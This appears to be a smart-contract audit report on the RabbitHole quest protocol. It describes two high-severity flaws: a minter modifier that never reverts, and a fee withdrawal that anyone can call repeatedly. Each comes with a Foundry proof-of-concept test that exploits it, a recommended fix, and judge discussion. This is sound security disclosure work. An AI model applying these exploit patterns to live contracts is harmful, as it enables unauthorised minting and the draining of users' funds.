[H-01] Bad implementation in minter access control forRabbitHoleReceiptandRabbitHoleTicketscontracts
Submitted byadriro, also found bybtk,luxartvinsec,KrisApostolov,Garrett,AlexCzm,Aymen0909,AlexCzm,Deivitto,petersspetrov,Josiah,c3phas,hansfriese,fellows,vagrant,sakshamguruji,yosuke,rbserver,rbserver,tsvetanovv,Kenshin,pfapostol,Awesome,7siech,gzeon,gzeon,oberon,Jayus,pavankv,ElKu,ElKu,xAriextz,xAriextz,shark,RaymondFam,paspe,paspe,amaechieth,SovaSlava,DimitarDimitrov,vanko1,codeislight,0xMirce,trustindistrust,navinavu,UdarTeam,AkshaySrivastav,Timenov,0xMAKEOUTHILL,prestoncodes,millersplanet,millersplanet,UdarTeam,usmannk,navinavu,Cryptor,frankudoags,mookimgo, andthekmj
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L58-L61https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L47-L50
BothRabbitHoleReceiptandRabbitHoleTicketscontracts define amintfunction that is protected by aonlyMintermodifier:
RabbitHoleReceipt:
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L98-L104
functionmint(addressto_,stringmemoryquestId_)publiconlyMinter{_tokenIds.increment();uintnewTokenID=_tokenIds.current();questIdForTokenId[newTokenID] =questId_;timestampForTokenId[newTokenID] =block.timestamp;_safeMint(to_,newTokenID);}
RabbitHoleTickets:
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L83-L85
functionmint(addressto_,uint256id_,uint256amount_,bytesmemorydata_)publiconlyMinter{_mint(to_,id_,amount_,data_);}
However, in both cases the modifier implementation is flawed as there isn’t any check for a require or revert, the comparison will silently return false and let the execution continue:
modifieronlyMinter() {msg.sender==minterAddress;_;}
Impact
Any account can mint any number ofRabbitHoleReceiptandRabbitHoleTicketstokens.
This represents a critical issue as receipts can be used to claim rewards in quests. An attacker can freely mint receipt tokens for any quest to steal all the rewards from it.
Proof of Concept
The following test demonstrates the issue.
contractAuditTestisTest{addressdeployer;uint256signerPrivateKey;addresssigner;addressroyaltyRecipient;addressminter;addressprotocolFeeRecipient;QuestFactoryfactory;ReceiptRendererreceiptRenderer;RabbitHoleReceiptreceipt;TicketRendererticketRenderer;RabbitHoleTicketstickets;ERC20token;functionsetUp()public{deployer=makeAddr("deployer");signerPrivateKey=0x123;signer=vm.addr(signerPrivateKey);vm.label(signer,"signer");royaltyRecipient=makeAddr("royaltyRecipient");minter=makeAddr("minter");protocolFeeRecipient=makeAddr("protocolFeeRecipient");vm.startPrank(deployer);// ReceiptreceiptRenderer=newReceiptRenderer();RabbitHoleReceiptreceiptImpl=newRabbitHoleReceipt();receipt=RabbitHoleReceipt(address(newERC1967Proxy(address(receiptImpl),"")));receipt.initialize(address(receiptRenderer),royaltyRecipient,minter,0);// factoryQuestFactoryfactoryImpl=newQuestFactory();factory=QuestFactory(address(newERC1967Proxy(address(factoryImpl),"")));factory.initialize(signer,address(receipt),protocolFeeRecipient);receipt.setMinterAddress(address(factory));// ticketsticketRenderer=newTicketRenderer();RabbitHoleTicketsticketsImpl=newRabbitHoleTickets();tickets=RabbitHoleTickets(address(newERC1967Proxy(address(ticketsImpl),"")));tickets.initialize(address(ticketRenderer),royaltyRecipient,minter,0);// ERC20 tokentoken=newERC20("Mock ERC20","MERC20");factory.setRewardAllowlistAddress(address(token),true);vm.stopPrank();}functiontest_RabbitHoleReceipt_RabbitHoleTickets_AnyoneCanMint()public{addressattacker=makeAddr("attacker");vm.startPrank(attacker);// Anyone can freely mint RabbitHoleReceiptstringmemoryquestId="a quest";receipt.mint(attacker,questId);assertEq(receipt.balanceOf(attacker),1);// Anyone can freely mint RabbitHoleTicketsuint256tokenId=0;tickets.mint(attacker,tokenId,1,"");assertEq(tickets.balanceOf(attacker,tokenId),1);vm.stopPrank();}}
Recommendation
The modifier should require that the caller is theminterAddressin order to revert the call in case this condition doesn’t hold.
modifieronlyMinter() {require(msg.sender==minterAddress);_;}
waynehoover (RabbitHole) confirmed

[H-02] Protocol fees can be withdrawn multiple times inErc20Quest
Submitted byadriro, also found bytimongty,trustindistrust,M4TZ1P,Garrett,holme,CodingNameKiki,hansfriese,fs0c,tnevler,lukris02,fs0c,fs0c,horsefacts,cryptonue,bytes032,sashik_eth,cccz,manikantanynala97,wait,rbserver,yixxas,Iurii3,hl_,zadaru13,MiniGlome,glcanvas,glcanvas,doublesharp,bin2chen,Lotus,KIntern_NA,SovaSlava,KmanOfficial,martin,peanuts,peakbolt,0xmrhoodie,gzeon,IllIllI,Bauer,0xngndev,0xngndev,mrpathfindr,mahdikarimi,evan,0xRobocop,zaskoh,omis,ArmedGoose,ElKu,Atarpara,codeislight,chaduke,trustindistrust,AkshaySrivastav,carrotsmuggler,hihen,prestoncodes,ladboy233,mert_eren,usmannk,Ruhum,HollaDieWaldfee, andrvierdiiev
ThewithdrawFeefunction present in theErc20Questcontract can be used to withdraw protocol fees after a quest has ended, which are sent to the protocol fee recipient address:
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102-L104
functionwithdrawFee()publiconlyAdminWithdrawAfterEnd{IERC20(rewardToken).safeTransfer(protocolFeeRecipient,protocolFee());}
This function doesn’t provide any kind of protection and can be called multiple times, which will send more tokens than intended to the protocol fee recipient, stealing funds from the contract.
Impact
ThewithdrawFeefunction can be called multiples after a quest has ended, potentially stealing funds from other people. The contract may have funds from unclaimed receipts (i.e. users that have completed the quest, redeemed their receipt but haven’t claimed their rewards yet) and remaining tokens from participants who didn’t complete the quest, which can be claimed back by the owner of the quest.
Note also that theonlyAdminWithdrawAfterEndmodifier, even though it indicates that an “admin” should be allowed to call this function, only validates the quest end time and fails to provide any kind of access control:
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L76-L79
modifieronlyAdminWithdrawAfterEnd() {if(block.timestamp<endTime)revertNoWithdrawDuringClaim();_;}
This means that anyone could call this function, so even if the quest owner or the protocol fee recipient behave correctly, a griefer could potentially call this function right after the quest end time to remove all (or most) of the funds from the contract.
Proof of Concept
In the following demonstration, thewithdrawFeefunction is called multiple times by a bad actor to remove all tokens from the quest contract.
contractAuditTestisTest{addressdeployer;uint256signerPrivateKey;addresssigner;addressroyaltyRecipient;addressminter;addressprotocolFeeRecipient;QuestFactoryfactory;ReceiptRendererreceiptRenderer;RabbitHoleReceiptreceipt;TicketRendererticketRenderer;RabbitHoleTicketstickets;ERC20token;functionsetUp()public{deployer=makeAddr("deployer");signerPrivateKey=0x123;signer=vm.addr(signerPrivateKey);vm.label(signer,"signer");royaltyRecipient=makeAddr("royaltyRecipient");minter=makeAddr("minter");protocolFeeRecipient=makeAddr("protocolFeeRecipient");vm.startPrank(deployer);// ReceiptreceiptRenderer=newReceiptRenderer();RabbitHoleReceiptreceiptImpl=newRabbitHoleReceipt();receipt=RabbitHoleReceipt(address(newERC1967Proxy(address(receiptImpl),"")));receipt.initialize(address(receiptRenderer),royaltyRecipient,minter,0);// factoryQuestFactoryfactoryImpl=newQuestFactory();factory=QuestFactory(address(newERC1967Proxy(address(factoryImpl),"")));factory.initialize(signer,address(receipt),protocolFeeRecipient);receipt.setMinterAddress(address(factory));// ticketsticketRenderer=newTicketRenderer();RabbitHoleTicketsticketsImpl=newRabbitHoleTickets();tickets=RabbitHoleTickets(address(newERC1967Proxy(address(ticketsImpl),"")));tickets.initialize(address(ticketRenderer),royaltyRecipient,minter,0);// ERC20 tokentoken=newERC20("Mock ERC20","MERC20");factory.setRewardAllowlistAddress(address(token),true);vm.stopPrank();}functionsignReceipt(addressaccount,stringmemoryquestId)internalviewreturns(bytes32hash,bytesmemorysignature){hash=keccak256(abi.encodePacked(account,questId));bytes32message=ECDSA.toEthSignedMessageHash(hash);(uint8v,bytes32r,bytes32s) =vm.sign(signerPrivateKey,message);signature=abi.encodePacked(r,s,v);}functionclaimReceipt(addressaccount,stringmemoryquestId)internal{(bytes32hash,bytesmemorysignature) =signReceipt(account,questId);vm.prank(account);factory.mintReceipt(questId,hash,signature);}functiontest_Erc20Quest_ProtocolFeeWithdrawMultipleTimes()public{addressalice=makeAddr("alice");addressattacker=makeAddr("attacker");uint256startTime=block.timestamp+1hours;uint256endTime=startTime+1hours;uint256totalParticipants=1;uint256rewardAmountOrTokenId=1ether;stringmemoryquestId="a quest";// create, fund and start questvm.startPrank(deployer);Erc20Questquest=Erc20Quest(factory.createQuest(address(token),endTime,startTime,totalParticipants,rewardAmountOrTokenId,"erc20",questId));uint256rewards=totalParticipants*rewardAmountOrTokenId;uint256fees= (rewards*factory.questFee()) /10_000;deal(address(token),address(quest),rewards+fees);quest.start();vm.stopPrank();// simulate at least one user claims a receiptclaimReceipt(alice,questId);// simulate time elapses until the end of the questvm.warp(endTime);// The following can be executed by attacker (griefer) or by the fee recipientvm.startPrank(attacker);uint256protocolFee=quest.protocolFee();uint256withdrawCalls= (rewards+fees) /protocolFee;for(uint256i=0;i<withdrawCalls;i++) {quest.withdrawFee();}// Fee recipient has 100% of the fundsassertEq(token.balanceOf(protocolFeeRecipient),rewards+fees);assertEq(token.balanceOf(address(quest)),0);vm.stopPrank();}}
Recommendation
Add a flag to the contract to indicate if protocol fees have been already withdrawn. Add a check to prevent the function from being called again.
waynehoover (RabbitHole) disagreed with severity and commented:
I agree that this is an issue, but not a high risk issue. I expect high risk issues to be issues that can be called by anyone, not owners.As owners there are plenty of ways we can sabotage our contracts (for example via the set* functions) it is up to the owner to be sure they are executing the function correctly and in the correct context.The owner understands how this function works, so they can be sure not to call it multiple times.
gzeon (warden) commented:
While I agree that this is an issue, but not a high risk issue. I expect high risk issues to be issues that can be called by anyone, not owners.As owners there are plenty of ways we can sabotage our contracts (for example via the set* functions) it is up to the owner to be sure they are executing the function correctly and in the correct context.The owner understands how this function works, so they can be sure not to call it multiple times.onlyAdminWithdrawAfterEndis notonlyAdmin, anyone can callwithdrawFeeafter end.
kirk-baird (judge) commented:
I agree with @gzeon. This issue is a combination of two sub issues:Anyone can callwithdrawFee()withdrawFee()can be called multiple timesAllowing it to be called by anyone is sufficient to rate it high severity.

